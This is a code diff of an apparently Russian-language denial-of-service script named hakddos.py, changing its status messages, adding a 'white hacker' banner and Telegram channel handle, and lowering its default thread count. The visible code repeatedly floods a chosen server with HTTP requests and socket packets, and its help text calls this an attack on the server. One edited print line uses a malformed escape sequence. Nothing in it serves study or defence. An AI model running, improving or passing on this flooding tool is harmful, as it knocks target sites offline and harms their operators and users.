@@ -90,7 +90,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[42m Не отправлено...\033[0m")
+			print ("\0160[92m",time.ctime(time.time()),"\0160[0m \0160[94m <-- Пакет не отправлен --> \0160[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -104,7 +104,7 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <-- Удачно! white haker --> \033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <-- Пакет отправлен --> \033[0m")
 			else:
 				s.shutdown(1)
 				print("\033[91mshut<->down\033[0m")
@@ -139,11 +139,22 @@ def usage():
      █████─█──█──█───█──█     █──█─█──█─█─█──█───█─█
      ─█─█──█──█─███──█──███   █──█─█──█─█──█─███─█─█
 
-	Что бы запустить: phyton3 hakddos.py -s Сайт -p Порт
+
+░██╗░░░░░░░██╗██╗░░██╗██╗████████╗███████╗  ██╗░░██╗░█████╗░██╗░░██╗███████╗██████╗░
+░██║░░██╗░░██║██║░░██║██║╚══██╔══╝██╔════╝  ██║░░██║██╔══██╗██║░██╔╝██╔════╝██╔══██╗
+░╚██╗████╗██╔╝███████║██║░░░██║░░░█████╗░░  ███████║███████║█████═╝░█████╗░░██████╔╝
+░░████╔═████║░██╔══██║██║░░░██║░░░██╔══╝░░  ██╔══██║██╔══██║██╔═██╗░██╔══╝░░██╔══██╗
+░░╚██╔╝░╚██╔╝░██║░░██║██║░░░██║░░░███████╗  ██║░░██║██║░░██║██║░╚██╗███████╗██║░░██║
+░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝╚═╝░░░╚═╝░░░╚══════╝  ╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
+
+	Наш чат в телеграмм канале @whitehaker01
+
+	Что бы запустить:
+     phyton3 hakddos.py -s Сайт -p Порт -t 135
 
 	-s : Сервер ip
 	-p : Порт Дефолт 80
-	-t : По умолчанию 8000 \033[0m''')
+	-t : По умолчанию 135 \033[0m''')
 	sys.exit()
 
 
@@ -156,7 +167,7 @@ def get_parameters():
 	optp.add_option("-q","--Тихий", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
 	optp.add_option("-s","--Сервер", dest="host",help="Атака на сервер ip -s ip")
 	optp.add_option("-p","--Порт",type="int",dest="port",help="-p 80 Дефолт 80")
-	optp.add_option("-t","--Турбо",type="int",dest="turbo",help="Дефолт 8000 -t 8000")
+	optp.add_option("-t","--Турбо",type="int",dest="turbo",help="Дефолт 135 -t 135")
 	optp.add_option("-h","--Помощь",dest="help",action='store_true',help="Помощь тебе")
 	opts, args = optp.parse_args()
 	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
@@ -171,7 +182,7 @@ def get_parameters():
 	else:
 		port = opts.port
 	if opts.turbo is None:
-		thr = 8000
+		thr = 135
 	else:
 		thr = opts.turbo
 
